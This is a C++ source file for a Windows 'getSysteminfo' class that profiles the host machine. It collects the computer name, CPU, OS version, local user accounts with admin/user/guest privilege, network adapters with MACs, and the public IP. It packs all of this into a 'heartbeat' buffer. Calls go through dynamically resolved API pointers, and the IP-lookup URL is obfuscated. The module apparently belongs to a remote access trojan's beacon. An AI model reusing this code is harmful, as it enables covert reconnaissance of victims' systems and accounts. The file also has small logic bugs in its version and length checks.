// getSysteminfo.cpp: implementation of the getSysteminfo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include <lm.h>
#include "getSysteminfo.h"
#include "FileVersion.h"
#include "WinApi.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

getSysteminfo::getSysteminfo()
{
	m_strComputerName.assign("");
	m_strSystemVersion.assign("");
	m_strCPU.assign("");
	m_strUser.assign("");
	m_strTimeZone.assign("");
	m_strInternetInfo.assign("");
	m_SystemType = VER_WIN98;
}

getSysteminfo::~getSysteminfo()
{
	if (SysBuf != NULL)
	{
		delete []SysBuf;
		SysBuf = NULL;
	}
}

void getSysteminfo::DestroyInstance()
{
	if ( m_pInstance != 0 )
	{
		delete m_pInstance;
		m_pInstance = 0;
	}
}

getSysteminfo *getSysteminfo::m_pInstance = 0;

getSysteminfo *getSysteminfo::GetInstance()
{
	if ( m_pInstance == 0 )
	{
		m_pInstance = new getSysteminfo();
	}
	
	return m_pInstance;
}

bool getSysteminfo::InitInfo()
{
	GetComputerNm();
	GetCPU();
	GetSystemVersion();
	GetInternetInfo();
	GetTimeZone();
	GetNetworkIp();
	if (m_SystemType != VER_WIN98)
	{
		GetUserInfo();
	}
	return true;
}

int getSysteminfo::GetHeartInfo(unsigned char *pBuf)
{
	int nSum = 4;
	memcpy(pBuf, "\r\n\r\n", 4);

	int nNamelen = m_strComputerName.length();
	if (nSum+nNamelen < 800)
	{
		memcpy(pBuf+nSum, m_strComputerName.c_str(), nNamelen);
		nSum += nNamelen;
	}
	else
	{
		pBuf[nSum] = '\0';
		return nSum;
	}
	
	int nCPUlen = m_strCPU.length();
	if (nSum+nCPUlen < 800)
	{
		memcpy(pBuf+nSum, "\1", 1);
		nSum += 1;
		memcpy(pBuf+nSum, m_strCPU.c_str(), nCPUlen);
		nSum += nCPUlen;
	}
	else
	{
		pBuf[nSum] = '\0';
		return nSum;
	}

	int nTimeZone = m_strTimeZone.length();
	if (nSum+nTimeZone < 800)
	{
		memcpy(pBuf+nSum, "\1", 1);
		nSum += 1;
		memcpy(pBuf+nSum, m_strTimeZone.c_str(), nTimeZone);
		nSum += nTimeZone;
	}
	else
	{
		pBuf[nSum] = '\0';
		return nSum;
	}

	int nOSInfo = m_strSystemVersion.length();
	if (nSum+nOSInfo < 800)
	{
		memcpy(pBuf+nSum, "\1", 1);
		nSum += 1;
		memcpy(pBuf+nSum, m_strSystemVersion.c_str(), nOSInfo);
		nSum += nOSInfo;
	}
	else
	{
		pBuf[nSum] = '\0';
		return nSum;
	}

	int nNetInfo = m_strInternetInfo.length();
	if (nSum+nNetInfo < 800)
	{
		memcpy(pBuf+nSum, "\1", 1);
		nSum += 1;
		memcpy(pBuf+nSum, m_strInternetInfo.c_str(), nNetInfo);
		nSum += nNetInfo;
	}
	else
	{
		pBuf[nSum] = '\0';
		return nSum;
	}

	int nNetIP = m_strNetworkIp.length();
	if (nSum+nNetInfo < 800)
	{
		memcpy(pBuf+nSum, "\1", 1);
		nSum += 1;
		memcpy(pBuf+nSum, m_strNetworkIp.c_str(), nNetIP);
		nSum += nNetIP;
	}
	else
	{
		pBuf[nSum] = '\0';
		return nSum;
	}

	pBuf[nSum] = '\0';
	return nSum;
}

BOOL getSysteminfo::GetCPU()
{
	char tmpCPU[1000];
	
    HKEY hKey;
#define BUFSIZE 256
    char szCPUInfo[BUFSIZE];
    DWORD szCPUFre =0;
    DWORD dwBufLen=BUFSIZE;
    LONG lRet;
	
    lRet = PRegOpenKeyExA( HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        0, KEY_QUERY_VALUE, &hKey );
    if( lRet != ERROR_SUCCESS )
    {
        strcpy(tmpCPU, "Unknown CPU type");
    }
    else
    {
        lRet = PRegQueryValueExA( hKey, "ProcessorNameString", NULL, NULL,
            (LPBYTE) szCPUInfo, &dwBufLen);
        if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
        {
            strcpy(tmpCPU, "Unknown CPU type");
        }
        else 
		{
            strcpy(tmpCPU, szCPUInfo);
        }
    }
    PRegCloseKey( hKey );
	
	m_strCPU.assign(tmpCPU);
	
	return TRUE;
}

BOOL getSysteminfo::GetTimeZone()
{
	m_strTimeZone.assign("+8");

	return TRUE;
}

BOOL getSysteminfo::GetComputerNm()
{
	const int MAX_BUFFER_LEN = 500;  
    WCHAR szBuffer[MAX_BUFFER_LEN];  
    DWORD dwNameLen;  
	
    dwNameLen = MAX_BUFFER_LEN;  
	if (!PGetComputerNameW(szBuffer, &dwNameLen))   
    {
		m_strComputerName.assign("");
	} 
    else
	{
		char * tmpstr = new char[dwNameLen*3];
		Unicode2UTF_8(szBuffer, tmpstr, dwNameLen*3);
		m_strComputerName.assign(tmpstr);
		delete []tmpstr;
	}
	
	return TRUE;
}

BOOL getSysteminfo::GetSystemVersion()
{
	const char* pstr = "WIN98";
	char m_WinVerStr[200];
	CFileVersion filever;
	DWORD dwMajorVersion, dwMinorVersion;
	
	if(filever.Open("C:\\WINDOWS\\system32\\kernel32.dll"))
	{
		filever.GetNumFileVersion(dwMajorVersion, dwMinorVersion);
		
		if(dwMajorVersion < 4)
		{
			pstr = "WINNT 3.51";
		}
		else if(dwMajorVersion==4 && dwMinorVersion==0)
			pstr = "WINNT 4.0";
		else if(dwMajorVersion==4 && dwMinorVersion==0)
			pstr = "WIN95";
		else if(dwMajorVersion==4 && dwMinorVersion==10)
			pstr = "WIN98";
		else if(dwMajorVersion==4 && dwMinorVersion==90)
			pstr = "WINMe";
		else if(dwMajorVersion==5 && dwMinorVersion==0)
		{
			pstr = "WIN2000";
			m_SystemType = VER_WIN2K;
		}
		else if(dwMajorVersion==5 && dwMinorVersion==1)
		{
			pstr = "WINXP";
			m_SystemType = VER_WINXP;
		}
		else if(dwMajorVersion==5 && dwMinorVersion==2)
		{
			pstr = "WIN2003";
			m_SystemType = VER_WIN2K3;
		}
		else if(dwMajorVersion==6 && dwMinorVersion==0)
		{
			pstr = "Vista32";
			m_SystemType = VER_Vista32;
		}
		else if(dwMajorVersion==6 && dwMinorVersion==1)
		{
			pstr = "Windows7";
			m_SystemType = VER_Windows7;
		}
		else if(dwMajorVersion==6 && dwMinorVersion==2)
		{
			pstr = "Windows8";
			m_SystemType = VER_Windows8;
		}
		else if (dwMajorVersion==6 && dwMinorVersion==3)
		{
			pstr = "Windows8.1";
			m_SystemType = VER_Windows81;
		}
		else if (dwMajorVersion==10 && dwMinorVersion==0)
		{
			pstr = "Windows10";
			m_SystemType = VER_Windows10;
		}
		else
			m_SystemType = VER_WindowsXX;
		
		memset(m_WinVerStr, 0, sizeof(m_WinVerStr));
		sprintf(m_WinVerStr, "%s\t%s", pstr, filever.GetProductVersion().c_str());
		
		m_strSystemVersion.assign(m_WinVerStr);
		return TRUE;
	}
	
	return FALSE;
}

BOOL getSysteminfo::GetUserInfo()
{
	WCHAR UsrLst[5000];
	int UsrLen = 5000;
	memset(UsrLst, 0, 2*UsrLen);
	
	LPUSER_INFO_3 pBuf   = NULL;
    LPUSER_INFO_3 pTmpBuf;
    DWORD i;
    DWORD dwLevel        = 3;
    DWORD dwPrefMaxLen   = -1;
    DWORD dwEntriesRead  = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    NET_API_STATUS nStatus;
	
	WCHAR Oneuser[200];
    do
    {
		nStatus = PNetUserEnum(NULL,dwLevel, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf,
			dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					if (pTmpBuf == NULL)
					{
						break;
					}
					
					switch(pTmpBuf->usri3_priv)
					{
					case USER_PRIV_GUEST:
						swprintf(Oneuser, L"%s\t%s\n", pTmpBuf->usri3_name, L"G");
						break;
					case USER_PRIV_USER:
						swprintf(Oneuser, L"%s\t%s\n", pTmpBuf->usri3_name, L"U");
						break;
					case USER_PRIV_ADMIN:
						swprintf(Oneuser, L"%s\t%s\n", pTmpBuf->usri3_name, L"A");
						break;
					default:
						swprintf(Oneuser, L"%s\t%s\n", pTmpBuf->usri3_name, L"N");
						break;
					}
					wcscat(UsrLst, Oneuser);
					
					pTmpBuf++;
				}
			}
		}
		
		if (pBuf != NULL)
		{
			PNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
    }while (nStatus == ERROR_MORE_DATA && wcslen(UsrLst) < UsrLen - 100);
	
    if (pBuf != NULL)
    {
		PNetApiBufferFree(pBuf);
    }
	
	UsrLen = wcslen(UsrLst);

	if (UsrLen > 0)
	{
		char * tmpstr = new char[UsrLen*3];
		Unicode2UTF_8(UsrLst, tmpstr, UsrLen*3);
		m_strUser.assign(tmpstr);
		delete []tmpstr;
	}
	else
	{
		m_strUser.assign("");
	}
	
	return TRUE;
}

BOOL getSysteminfo::GetInternetInfo()
{
	char IpInfo[500];
	memset(IpInfo, 0, 500);
	
	ULONG len	=0;
	int datalen	=0;
	int ilen	=0;
	PIP_ADAPTER_INFO pinfo=NULL;
	ULONG nError  = PGetAdaptersInfo(pinfo, &len);  
	if (nError==ERROR_NO_DATA)
	{
		strcpy(IpInfo, "none");
		//OutPut("没有网络设备信息");
	}
	if (nError==ERROR_NOT_SUPPORTED)
	{
		strcpy(IpInfo, "none");
		//OutPut("GetAdaptersInfo不支持本系统");
	}
	if (nError==ERROR_BUFFER_OVERFLOW)
	{
		pinfo	= (PIP_ADAPTER_INFO)malloc(len);
		nError  = PGetAdaptersInfo(pinfo,&len);
	}
	
	if(nError==0)
	{
		char * ipaddress = NULL;
		IP_ADDR_STRING *paddr=NULL;
		while(pinfo!=NULL)
		{
			ipaddress = GetFormatIP(pinfo->IpAddressList.IpAddress.String);
			if(ipaddress!=NULL)
			{
				if(strlen(ipaddress) == 0)
					strcat(IpInfo, "none");
				else
				{
					strcat(IpInfo, ipaddress);
					strcat(IpInfo,"\t");
					
					char mac[30];
					memset(mac,0,30);
					sprintf(mac, "%02X-%02X-%02X-%02X-%02X-%02X",
						pinfo->Address[0],
						pinfo->Address[1],
						pinfo->Address[2],
						pinfo->Address[3],
						pinfo->Address[4],
						pinfo->Address[5] );
					strcat(IpInfo,mac);	
				}
			}
			strcat(IpInfo, "\t");
			
			ipaddress = GetFormatIP(pinfo->GatewayList.IpAddress.String);
			if(ipaddress!=NULL)
			{
				if(strlen(ipaddress) == 0)
					strcat(IpInfo, "none");
				else
				{
					strcat(IpInfo, ipaddress);
				}
			}
			strcat(IpInfo, "\n");
			pinfo = pinfo->Next;
		}
	}

	m_strInternetInfo.assign(IpInfo);

	return TRUE;
}

BOOL getSysteminfo::GetNetworkIp()
{
	BOOL flag = FALSE;
	BOOL internetreadfile; 
	int i=0;
	DWORD byteread=0; 
	char buffer[100]; 
	memset(buffer,0,100); 
	HINTERNET internetopen; 
	internetopen = PInternetOpenA("IP",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0); 
	if (internetopen==NULL)
	{
		m_strNetworkIp.assign("0");
		return FALSE;
	} 
	HINTERNET internetopenurl; 
	char szUrl[50];
	//http://icanhazip.com/
	SysinfStringA(szUrl, 50, ".ppDm//aAzW.znaDeALY/");
	internetopenurl = PInternetOpenUrlA(internetopen, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0); 
	if (internetopenurl==NULL)
	{
		m_strNetworkIp.assign("0");
		goto there;
	} 
	
	PSleep(1000);
	
	memset(buffer, 0, sizeof(buffer));
	internetreadfile = PInternetReadFile(internetopenurl,buffer,sizeof(buffer),&byteread); 
	if(byteread > 7)
	{
		buffer[byteread-1] = '\0';
		m_strNetworkIp = GetFormatIP(buffer);
		flag = TRUE;
	}
	else
	{
		m_strNetworkIp.assign("0");
	}

	
	PInternetCloseHandle(internetopenurl); 
there: 
	PInternetCloseHandle(internetopen);
	
	return flag;
}

// int GetSystemType(WCHAR* buf)
// {
// 	int offset=0;
// 	DWORD dd = GetSystemDefaultLCID();
// 	
// 	switch(dd)
// 	{
// 	case 0x804 :
// 		offset = swprintf(buf, L"操作系统的语言版本: 代码 %08x, 中文简体(大陆)\r\n", dd);
// 		break;
// 	case 0x404 :
// 		offset = swprintf(buf, L"操作系统的语言版本: 代码 %08x, 中文繁体(台湾)\r\n", dd);
// 		break;
// 	case 0x409: 
// 		offset = swprintf(buf, L"操作系统的语言版本:  代码 %08x, 英文\r\n", dd);
// 		break;
// 	default:
// 		offset = swprintf(buf, L"操作系统的语言版本:  代码 %08x, 其它语言系统\r\n", dd);
// 		break;
// 	}
// 	
// 	return offset;
// }




